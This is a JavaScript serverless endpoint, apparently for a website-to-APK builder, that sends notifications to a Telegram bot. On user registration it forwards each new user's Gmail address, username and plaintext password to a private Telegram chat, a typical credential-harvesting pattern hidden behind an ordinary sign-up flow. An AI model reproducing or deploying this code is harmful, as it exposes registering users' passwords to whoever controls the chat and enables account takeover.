export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, data } = req.body || {};
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({ error: 'Telegram env vars missing (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)' });
  }

  let text = '';

  if (type === 'register') {
    const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    text = `🚨 *PENDAFTARAN BARU* 🚨\n\n` +
           `📧 *Gmail:* ${data.email}\n` +
           `👤 *Username:* ${data.username}\n` +
           `🔑 *Password:* ${data.password}\n` +
           `⏰ *Waktu:* ${time}`;
  } else if (type === 'build') {
    const sourceType = data.sourceType === 'url' ? 'Website (URL)' : 'File HTML';
    const sourceVal = data.sourceType === 'url' ? data.sourceUrl : 'File HTML diunggah';
    
    text = `📦 *BUILD APK BARU* 📦\n\n` +
           `🌐 *Sumber:* ${sourceType} - ${sourceVal}\n` +
           `📱 *Nama APK:* ${data.appName}\n` +
           `👤 *Pembuat:* ${data.creator}\n` +
           `🆔 *Package:* ${data.packageName}`;
  } else {
    return res.status(400).json({ error: 'Invalid notification type' });
  }

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
      })
    });
    
    if (!response.ok) {
      const err = await response.json();
      throw new Error(err.description || 'Telegram API error');
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
}